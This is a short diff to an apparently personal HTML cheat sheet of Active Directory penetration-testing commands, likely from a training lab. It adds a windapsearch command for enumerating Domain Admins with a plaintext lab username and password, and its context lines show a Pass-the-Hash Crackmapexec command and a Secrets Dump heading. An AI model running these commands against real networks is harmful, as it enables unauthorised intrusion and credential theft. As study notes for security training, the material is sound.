@@ -73,6 +73,9 @@ Look on printers <br>
   
   <h1> Pass the Hash </h1><br>
   Crackmapexec IP -u username -H hash --local-auth <br>
+  <br>
+  <h1> Find valid Domain Admins with lower account </h1> <br>
+  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
   
  <br>
   <h1> Secrets Dump </h1> <br>
